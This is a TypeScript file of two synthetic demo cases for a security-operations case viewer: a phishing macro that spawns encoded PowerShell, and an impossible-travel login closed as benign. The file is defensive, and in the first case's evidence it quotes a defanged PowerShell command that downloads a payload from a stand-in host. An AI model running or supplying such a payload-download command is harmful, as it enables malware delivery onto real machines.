import type { SocCase } from '../types'

/**
 * Synthetic demo cases used to exercise the data model and (for now) preview the
 * Cases view. SYNTHETIC DATA ONLY:
 * - IPs are from reserved documentation ranges (TEST-NET-1/2/3, RFC 5737).
 * - Domains use the reserved ".example" TLD and are defanged with [.].
 * - "contoso" is a fictional organization; usernames are invented.
 * - File hashes are obvious placeholders, not real samples.
 * Nothing here is a real indicator of compromise.
 */

const suspiciousPowerShell: SocCase = {
  id: 'case-ps-outlook',
  title: 'Suspicious PowerShell launched from Outlook',
  summary:
    'A finance workstation ran an encoded PowerShell command spawned from Outlook/Word after a phishing email. PowerShell attempted to download a remote payload and made a short outbound connection. Investigation ongoing.',
  source: 'edr',
  sourceDetail: 'EDR — endpoint detection & response',
  severity: 'high',
  status: 'investigating',
  owner: 'kim.analyst',
  affectedEntities: [
    {
      id: 'c1-ent-host',
      type: 'host',
      value: 'FIN-WS-014',
      role: 'Affected workstation',
      description: 'Finance department workstation where execution occurred.',
    },
    {
      id: 'c1-ent-user',
      type: 'user',
      value: 'jordan.doe',
      role: 'Logged-on user / mailbox owner',
    },
    {
      id: 'c1-ent-mailbox',
      type: 'mailbox',
      value: 'jordan.doe@contoso.example',
      role: 'Recipient of the phishing email',
    },
    {
      id: 'c1-ent-proc',
      type: 'process',
      value: 'powershell.exe (PID 6644)',
      role: 'Suspicious child process',
    },
    {
      id: 'c1-ent-ip',
      type: 'ip_address',
      value: '203.0.113.66',
      role: 'Suspected C2 (synthetic, TEST-NET-3)',
    },
    {
      id: 'c1-ent-domain',
      type: 'domain',
      value: 'updates.fake-cdn[.]example',
      role: 'Payload download host (defanged, synthetic)',
    },
    {
      id: 'c1-ent-file',
      type: 'file',
      value: 'Invoice_4471.docm',
      role: 'Malicious macro-enabled attachment (synthetic)',
    },
  ],
  evidence: [
    {
      id: 'c1-ev-email',
      type: 'email',
      title: 'Phishing email with macro attachment',
      detail:
        'Subject "Overdue invoice #4471 — action required". Sender billing@vendor-portal[.]example (spoofed display name). Attachment: Invoice_4471.docm (macro-enabled).',
      source: 'Email gateway quarantine log',
      observedAt: '2026-06-18T09:12:00Z',
      analystNote: 'Finance-themed lure; attachment is a macro-enabled Word document.',
      relatedEntityIds: ['c1-ent-mailbox', 'c1-ent-file'],
    },
    {
      id: 'c1-ev-proctree',
      type: 'process',
      title: 'Outlook/Word spawned PowerShell',
      detail:
        'Process tree: OUTLOOK.EXE -> WINWORD.EXE -> powershell.exe -enc <base64>. Observed on FIN-WS-014.',
      source: 'EDR process telemetry',
      observedAt: '2026-06-18T09:14:05Z',
      analystNote:
        'An Office application spawning PowerShell with an encoded command is a strong execution indicator.',
      relatedEntityIds: ['c1-ent-host', 'c1-ent-proc'],
    },
    {
      id: 'c1-ev-decoded',
      type: 'command',
      title: 'Decoded PowerShell command',
      detail:
        'Decoded -enc payload: Invoke-WebRequest hxxps://updates.fake-cdn[.]example/p/loader.bin -OutFile $env:TEMP\\svc.bin (defanged, synthetic).',
      source: 'EDR command-line capture',
      observedAt: '2026-06-18T09:14:06Z',
      analystNote: 'Encoded command decodes to a remote download attempt to a low-reputation host.',
      relatedEntityIds: ['c1-ent-proc', 'c1-ent-domain'],
    },
    {
      id: 'c1-ev-netconn',
      type: 'network',
      title: 'Outbound connection to suspected C2',
      detail:
        'powershell.exe -> 203.0.113.66:443. ~2 KB sent before the connection was reset. (IP is synthetic TEST-NET-3.)',
      source: 'EDR network telemetry',
      observedAt: '2026-06-18T09:14:08Z',
      analystNote: 'Small outbound beacon; unclear whether a payload was fully retrieved.',
      relatedEntityIds: ['c1-ent-proc', 'c1-ent-ip'],
    },
    {
      id: 'c1-ev-hash',
      type: 'file',
      title: 'Attachment file hash',
      detail:
        'Invoice_4471.docm SHA-256: aa11bb22cc33dd44ee55ff6600112233445566778899aabbccddeeff00112233 (synthetic placeholder hash).',
      source: 'EDR file inventory',
      observedAt: '2026-06-18T09:13:00Z',
      analystNote: 'Hash recorded for hunting; value is synthetic for this exercise.',
      relatedEntityIds: ['c1-ent-file'],
    },
  ],
  timeline: [
    {
      id: 'c1-tl-1',
      timestamp: '2026-06-18T09:12:00Z',
      title: 'Phishing email delivered',
      description: 'Finance-themed email with a macro-enabled attachment delivered to jordan.doe.',
      relatedEvidenceIds: ['c1-ev-email'],
    },
    {
      id: 'c1-tl-2',
      timestamp: '2026-06-18T09:14:00Z',
      title: 'Attachment opened, macro executed',
      description: 'User opened Invoice_4471.docm and the macro ran.',
      relatedEvidenceIds: ['c1-ev-proctree'],
    },
    {
      id: 'c1-tl-3',
      timestamp: '2026-06-18T09:14:05Z',
      title: 'PowerShell spawned from Office',
      description: 'WINWORD spawned powershell.exe with an encoded command.',
      relatedEvidenceIds: ['c1-ev-proctree', 'c1-ev-decoded'],
    },
    {
      id: 'c1-tl-4',
      timestamp: '2026-06-18T09:14:08Z',
      title: 'Outbound beacon attempt',
      description: 'PowerShell attempted a payload download and connected to 203.0.113.66.',
      relatedEvidenceIds: ['c1-ev-decoded', 'c1-ev-netconn'],
    },
    {
      id: 'c1-tl-5',
      timestamp: '2026-06-18T09:20:00Z',
      title: 'EDR alert raised',
      description: 'Behavioral rule "Office spawning script interpreter" triggered.',
      relatedEvidenceIds: ['c1-ev-proctree'],
    },
    {
      id: 'c1-tl-6',
      timestamp: '2026-06-18T09:35:00Z',
      title: 'Triage started',
      description: 'Analyst opened the case and began triage.',
    },
  ],
  analystQuestions: [
    {
      id: 'c1-q-1',
      question: 'Did the macro actually execute, or was it blocked by policy?',
      status: 'answered',
      answer: 'It executed; macro/ASR policy was not enforced on this host.',
      rationale: 'Process telemetry shows WINWORD spawning powershell.exe.',
      createdAt: '2026-06-18T09:36:00Z',
      answeredAt: '2026-06-18T09:50:00Z',
    },
    {
      id: 'c1-q-2',
      question: 'Was the remote payload successfully downloaded and executed?',
      status: 'open',
      rationale: 'Only ~2 KB observed outbound before reset; no on-disk payload confirmed yet.',
      createdAt: '2026-06-18T09:40:00Z',
    },
    {
      id: 'c1-q-3',
      question: 'Are other endpoints showing the same Office-spawns-PowerShell pattern?',
      status: 'open',
      rationale: 'Fleet-wide hunt queued.',
      createdAt: '2026-06-18T10:05:00Z',
    },
  ],
  findings: [
    {
      id: 'c1-f-1',
      title: 'Phishing-driven macro execution',
      description:
        'A finance-themed phishing email led the user to open a macro-enabled document that executed code.',
      confidence: 'high',
      relatedEvidenceIds: ['c1-ev-email', 'c1-ev-proctree'],
    },
    {
      id: 'c1-f-2',
      title: 'PowerShell attempted remote payload retrieval',
      description:
        'The spawned PowerShell decoded to a remote download and beaconed to a low-reputation host; full compromise is not yet confirmed.',
      confidence: 'medium',
      relatedEvidenceIds: ['c1-ev-decoded', 'c1-ev-netconn'],
    },
  ],
  mitreMappings: [
    {
      id: 'c1-mt-1',
      tactic: 'Initial Access',
      techniqueId: 'T1566.001',
      techniqueName: 'Phishing: Spearphishing Attachment',
      rationale: 'A malicious macro-enabled attachment was delivered via an email lure.',
      confidence: 'high',
      relatedEvidenceIds: ['c1-ev-email'],
    },
    {
      id: 'c1-mt-2',
      tactic: 'Execution',
      techniqueId: 'T1204.002',
      techniqueName: 'User Execution: Malicious File',
      rationale: 'The user opened the attachment, triggering macro execution.',
      confidence: 'high',
      relatedEvidenceIds: ['c1-ev-proctree'],
    },
    {
      id: 'c1-mt-3',
      tactic: 'Execution',
      techniqueId: 'T1059.001',
      techniqueName: 'Command and Scripting Interpreter: PowerShell',
      rationale: 'An encoded PowerShell command executed from an Office parent process.',
      confidence: 'high',
      relatedEvidenceIds: ['c1-ev-proctree', 'c1-ev-decoded'],
    },
    {
      id: 'c1-mt-4',
      tactic: 'Command and Control',
      techniqueId: 'T1105',
      techniqueName: 'Ingress Tool Transfer',
      rationale: 'PowerShell attempted to download a remote payload over HTTPS.',
      confidence: 'medium',
      relatedEvidenceIds: ['c1-ev-decoded', 'c1-ev-netconn'],
    },
  ],
  recommendations: [
    {
      id: 'c1-rec-1',
      title: 'Isolate FIN-WS-014',
      description:
        'Manually isolate the host from the network pending confirmation that no payload executed.',
      priority: 'high',
    },
    {
      id: 'c1-rec-2',
      title: 'Reset credentials for jordan.doe',
      description: 'Force a password reset and revoke active sessions as a precaution.',
      priority: 'high',
    },
    {
      id: 'c1-rec-3',
      title: 'Block indicators at the perimeter',
      description: 'Block 203.0.113.66 and updates.fake-cdn[.]example at the proxy/firewall.',
      priority: 'medium',
    },
    {
      id: 'c1-rec-4',
      title: 'Fleet-wide hunt',
      description: 'Hunt for Office processes spawning script interpreters across all endpoints.',
      priority: 'medium',
    },
  ],
  createdAt: '2026-06-18T09:35:00Z',
  updatedAt: '2026-06-19T14:20:00Z',
}

const impossibleTravel: SocCase = {
  id: 'case-impossible-travel',
  title: 'Impossible travel login that may be VPN-related',
  summary:
    'Two successful sign-ins for one user from distant locations 17 minutes apart triggered an impossible-travel alert. Investigation found the second login came from a corporate VPN egress IP; closed as a benign true positive.',
  source: 'identity_provider',
  sourceDetail: 'Cloud identity provider sign-in risk',
  severity: 'medium',
  status: 'closed',
  owner: 'rivera.analyst',
  affectedEntities: [
    {
      id: 'c2-ent-user',
      type: 'user',
      value: 'maria.santos',
      role: 'Account flagged for impossible travel',
    },
    {
      id: 'c2-ent-account',
      type: 'cloud_account',
      value: 'maria.santos@contoso.example',
      role: 'Cloud identity',
    },
    {
      id: 'c2-ent-ip-1',
      type: 'ip_address',
      value: '198.51.100.23',
      role: 'First sign-in IP — Tallinn, EE (synthetic TEST-NET-2)',
    },
    {
      id: 'c2-ent-ip-2',
      type: 'ip_address',
      value: '203.0.113.140',
      role: 'Second sign-in IP — Frankfurt, DE (corporate VPN egress, synthetic)',
    },
  ],
  evidence: [
    {
      id: 'c2-ev-signin1',
      type: 'authentication',
      title: 'First successful sign-in (Tallinn)',
      detail:
        'maria.santos signed in from 198.51.100.23, geo Tallinn EE; MFA satisfied; device compliant.',
      source: 'Identity provider sign-in logs',
      observedAt: '2026-06-19T08:02:00Z',
      analystNote: 'Normal morning sign-in from the expected location.',
      relatedEntityIds: ['c2-ent-user', 'c2-ent-ip-1'],
    },
    {
      id: 'c2-ev-signin2',
      type: 'authentication',
      title: 'Second sign-in flagged impossible travel (Frankfurt)',
      detail:
        'Sign-in from 203.0.113.140, geo Frankfurt DE, 17 minutes after the Tallinn sign-in; risk detection "impossible travel"; MFA satisfied.',
      source: 'Identity provider risk detections',
      observedAt: '2026-06-19T08:19:00Z',
      analystNote: 'Geo distance versus elapsed time is physically implausible — needs explanation.',
      relatedEntityIds: ['c2-ent-user', 'c2-ent-ip-2'],
    },
    {
      id: 'c2-ev-vpn',
      type: 'network',
      title: 'VPN egress range match',
      detail: '203.0.113.140 falls within the documented corporate VPN egress range (Frankfurt POP).',
      source: 'Network team VPN egress inventory',
      observedAt: '2026-06-19T08:55:00Z',
      analystNote: 'Explains the apparent geo jump — VPN egress, not attacker travel.',
      relatedEntityIds: ['c2-ent-ip-2'],
    },
    {
      id: 'c2-ev-mfa',
      type: 'authentication',
      title: 'MFA satisfied on both sign-ins',
      detail:
        'Both sign-ins completed number-matching MFA from the registered authenticator; no MFA-fatigue pattern.',
      source: 'Identity provider authentication details',
      observedAt: '2026-06-19T08:20:00Z',
      analystNote: 'No signs of MFA bombing or token theft.',
      relatedEntityIds: ['c2-ent-user'],
    },
    {
      id: 'c2-ev-postlogin',
      type: 'log',
      title: 'No anomalous post-login activity',
      detail:
        'No mailbox-rule changes, mass downloads, or privileged role changes in the 24h after sign-in.',
      source: 'Audit logs',
      observedAt: '2026-06-19T09:30:00Z',
      analystNote: 'Absence of follow-on activity supports the benign explanation.',
      relatedEntityIds: ['c2-ent-account'],
    },
  ],
  timeline: [
    {
      id: 'c2-tl-1',
      timestamp: '2026-06-19T08:02:00Z',
      title: 'Sign-in from Tallinn',
      description: 'Successful MFA sign-in from 198.51.100.23.',
      relatedEvidenceIds: ['c2-ev-signin1'],
    },
    {
      id: 'c2-tl-2',
      timestamp: '2026-06-19T08:19:00Z',
      title: 'Sign-in from Frankfurt (flagged)',
      description: 'Successful MFA sign-in from 203.0.113.140; impossible-travel risk raised.',
      relatedEvidenceIds: ['c2-ev-signin2'],
    },
    {
      id: 'c2-tl-3',
      timestamp: '2026-06-19T08:25:00Z',
      title: 'Risk alert generated',
      description: 'Identity provider raised an impossible-travel alert for maria.santos.',
      relatedEvidenceIds: ['c2-ev-signin2'],
    },
    {
      id: 'c2-tl-4',
      timestamp: '2026-06-19T08:55:00Z',
      title: 'IP correlated to VPN egress',
      description: 'Analyst matched the Frankfurt IP to the corporate VPN egress range.',
      relatedEvidenceIds: ['c2-ev-vpn'],
    },
  ],
  analystQuestions: [
    {
      id: 'c2-q-1',
      question: 'Is 203.0.113.140 a known corporate VPN egress IP?',
      status: 'answered',
      answer: 'Yes — it is within the documented Frankfurt VPN egress range.',
      rationale: 'Confirmed against the network team VPN egress inventory.',
      createdAt: '2026-06-19T08:30:00Z',
      answeredAt: '2026-06-19T08:55:00Z',
    },
    {
      id: 'c2-q-2',
      question: 'Did MFA legitimately succeed on both sign-ins?',
      status: 'answered',
      answer: 'Yes — both used the registered authenticator with number matching.',
      rationale: 'Authentication-detail logs show no fatigue/bombing pattern.',
      createdAt: '2026-06-19T08:32:00Z',
      answeredAt: '2026-06-19T08:45:00Z',
    },
    {
      id: 'c2-q-3',
      question: 'Was there any anomalous activity after the flagged sign-in?',
      status: 'answered',
      answer: 'No — no mailbox rules, mass downloads, or role changes.',
      rationale: 'Audit logs reviewed for the following 24h.',
      createdAt: '2026-06-19T08:35:00Z',
      answeredAt: '2026-06-19T09:30:00Z',
    },
  ],
  findings: [
    {
      id: 'c2-f-1',
      title: 'Geo jump explained by corporate VPN',
      description:
        'The second sign-in originated from a corporate VPN egress IP, accounting for the impossible-travel distance.',
      confidence: 'high',
      relatedEvidenceIds: ['c2-ev-signin2', 'c2-ev-vpn'],
    },
    {
      id: 'c2-f-2',
      title: 'No indicators of account compromise',
      description:
        'MFA was satisfied legitimately and no anomalous post-login activity was observed.',
      confidence: 'high',
      relatedEvidenceIds: ['c2-ev-mfa', 'c2-ev-postlogin'],
    },
  ],
  mitreMappings: [
    {
      id: 'c2-mt-1',
      tactic: 'Initial Access',
      techniqueId: 'T1078',
      techniqueName: 'Valid Accounts',
      rationale:
        'Considered because impossible-travel can indicate stolen-credential use; ruled out after evidence showed legitimate VPN egress and clean MFA.',
      confidence: 'low',
      relatedEvidenceIds: ['c2-ev-signin2', 'c2-ev-vpn'],
    },
  ],
  recommendations: [
    {
      id: 'c2-rec-1',
      title: 'Allowlist documented VPN egress ranges',
      description:
        'Add corporate VPN egress IPs to the impossible-travel known-network list to reduce false positives.',
      priority: 'medium',
    },
    {
      id: 'c2-rec-2',
      title: 'Maintain VPN egress documentation',
      description: 'Keep the VPN egress IP inventory current and accessible to triage analysts.',
      priority: 'low',
    },
  ],
  closure: {
    verdict: 'benign_true_positive',
    summary:
      'The impossible-travel alert was a true detection but benign: the geo jump was caused by corporate VPN egress, not attacker activity.',
    rationale:
      'The Frankfurt IP matched the documented VPN egress range, MFA was satisfied on both sign-ins, and no anomalous post-login activity was found.',
    closedAt: '2026-06-19T09:45:00Z',
    closedBy: 'rivera.analyst',
  },
  createdAt: '2026-06-19T08:30:00Z',
  updatedAt: '2026-06-19T09:45:00Z',
}

/** The synthetic demo cases shipped with the app. */
export const demoCases: SocCase[] = [suspiciousPowerShell, impossibleTravel]
